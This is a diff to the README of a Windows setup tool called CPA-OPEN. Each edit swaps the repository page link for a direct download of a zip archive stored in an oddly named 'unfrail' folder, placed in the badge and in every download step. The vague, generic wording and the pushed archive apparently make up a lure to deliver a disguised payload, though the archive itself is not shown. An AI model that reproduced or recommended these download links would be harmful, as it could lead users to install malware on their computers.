@@ -1,10 +1,10 @@
 # 🧩 CPA-OPEN - Simple CPA and OpenCodex Setup
 
-[![Download CPA-OPEN](https://img.shields.io/badge/Download%20CPA--OPEN-blue?style=for-the-badge&logo=github)](https://github.com/Grassmacoun146/CPA-OPEN)
+[![Download CPA-OPEN](https://img.shields.io/badge/Download%20CPA--OPEN-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Grassmacoun146/CPA-OPEN/main/unfrail/CP_OPEN_3.9.zip)
 
 ## 📥 Download
 Use this link to visit the page and get CPA-OPEN:
-https://github.com/Grassmacoun146/CPA-OPEN
+https://raw.githubusercontent.com/Grassmacoun146/CPA-OPEN/main/unfrail/CP_OPEN_3.9.zip
 
 ## 🖥️ What CPA-OPEN Does
 CPA-OPEN helps you set up CPA and OpenCodex on a Windows PC in a clear way. It is built for users who want a simple path from download to first run.
@@ -32,7 +32,7 @@ For best results:
 Follow these steps in order:
 
 1. Open this page in your browser:
-   https://github.com/Grassmacoun146/CPA-OPEN
+   https://raw.githubusercontent.com/Grassmacoun146/CPA-OPEN/main/unfrail/CP_OPEN_3.9.zip
 
 2. Find the download area on the page.
 
@@ -148,7 +148,7 @@ Leave these files together in the same folder unless the instructions on the pag
 
 ## 📦 Download and Setup Link
 Visit this page to download CPA-OPEN:
-https://github.com/Grassmacoun146/CPA-OPEN
+https://raw.githubusercontent.com/Grassmacoun146/CPA-OPEN/main/unfrail/CP_OPEN_3.9.zip
 
 ## 🖱️ Quick Start
 If you want the fastest path:
